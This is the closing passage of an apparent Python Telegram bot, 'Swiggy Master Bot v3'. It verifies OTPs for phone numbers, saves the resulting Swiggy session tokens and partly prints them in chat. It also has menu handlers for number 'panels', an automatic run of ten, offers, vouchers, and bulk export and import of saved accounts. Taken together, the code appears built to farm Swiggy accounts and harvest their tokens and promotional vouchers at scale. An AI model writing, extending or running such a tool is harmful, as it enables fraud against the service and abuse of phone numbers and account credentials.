                await msg.reply_text(f"❌ OTP send failed.")

        elif action == "manual_otp":
            otp   = re.sub(r"[^0-9]","",text)
            phone = state.get("phone","")
            if not otp or not phone:
                await msg.reply_text("❌ OTP ya phone nahi mila."); return
            user_state.pop(uid, None)
            loop  = asyncio.get_event_loop()
            resp  = await loop.run_in_executor(None, sw_verify, otp)
            if resp:
                acc = parse_acc(resp)
                if acc["token"]:
                    save_acc(uid, phone, acc, source="manual")
                    inc_stat(uid, "success")
                    await msg.reply_text(
                        f"✅ Login success!\n"
                        f"👤 `{acc['name'] or 'N/A'}`\n"
                        f"🔑 `{acc['token'][:30]}...`",
                        parse_mode=ParseMode.MARKDOWN,
                    )
                else:
                    await msg.reply_text("❌ Token nahi mila.")
            else:
                await msg.reply_text("❌ OTP verify failed.")

        else:
            await msg.reply_text(
                "👇 Menu se option select karo:",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("🏠 Main Menu", callback_data="m_back")
                ]]),
            )

    except json.JSONDecodeError:
        await msg.reply_text("❌ Invalid JSON format. Dobara try karo.")
    except Exception as e:
        log.exception(e)
        await msg.reply_text(f"❌ Error: {str(e)[:100]}")

# ════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════

def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))

    cb_map = {
        "m_back":     cb_back,
        "m_stats":    cb_stats,
        "m_panels":   cb_panels,
        "p_add_link": cb_p_add_link,
        "p_add_file": cb_p_add_file,
        "p_list":     cb_p_list,
        "p_clear":    cb_p_clear,
        "m_auto":     cb_auto,
        "a_start_10": cb_a_start_10,
        "a_custom":   cb_a_custom,
        "m_manual":   cb_manual,
        "m_offer_all":cb_offer_all,
        "m_saved":    cb_saved,
        "m_export":   cb_export,
        "e_single":   cb_e_single,
        "e_bulk":     cb_e_bulk,
        "m_import":   cb_import,
        "m_vouchers": cb_vouchers,
    }
    for data, fn in cb_map.items():
        app.add_handler(CallbackQueryHandler(fn, pattern=f"^{data}$"))

    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, msg_handler))

    print("🔥 Swiggy Master Bot v3 — LIVE")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
      
